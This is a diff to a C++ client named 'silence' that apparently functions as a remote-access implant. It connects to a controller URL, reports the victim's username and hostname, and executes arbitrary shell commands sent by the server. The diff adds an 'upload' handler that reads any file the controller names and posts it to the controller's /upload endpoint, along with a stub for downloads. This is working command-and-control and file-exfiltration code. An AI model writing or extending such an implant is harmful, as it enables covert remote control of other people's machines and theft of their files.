@@ -7,7 +7,7 @@
 namespace silence {
     Client::Client(std::string url)
             : mUrl(std::move(url)), mIO(new sio::client()), mInstallDirectory(fs::current_path()),
-              mUsername(impl::username()), mHostname(impl::hostname()) {
+              mUsername(impl::username()), mHostname(impl::hostname()), mHttpClient(mUrl.c_str()) {
         mSocket = mIO->socket();
 
         mSocket->on("command",
@@ -93,6 +93,8 @@ namespace silence {
             installDirEvent(commandObject);
         else if (event == "cmd")
             cmdEvent(commandObject);
+        else if (event == "upload")
+            uploadEvent(commandObject);
         else
             response(event, SIOSTR("Unknown event"));
     }
@@ -194,6 +196,23 @@ namespace silence {
     void Client::cmdEvent(const CommandObject &object) {
         response("cmd", SIOSTR(
                 *impl::exec(object.at("command")->get_string().c_str())));
+    }
+
+    void Client::uploadEvent(const CommandObject &object) {
+        assert(mHttpClient.is_valid());
+        fs::path path{object.at("file")->get_string()};
+        std::ifstream fileStream(path);
+        std::stringstream fileBuffer;
+        fileBuffer << fileStream.rdbuf();
+
+        httplib::MultipartFormDataItems items = {
+                {"uploadFile", fileBuffer.str(), path.filename(), "application/octet-stream"},
+        };
+        auto resSendFiles = mHttpClient.Post("/upload", items);
+    }
+
+    void Client::downloadEvent(const CommandObject &object) {
+
     }
 
     void Client::response(const std::string &event, const sio::message::list &msg) {
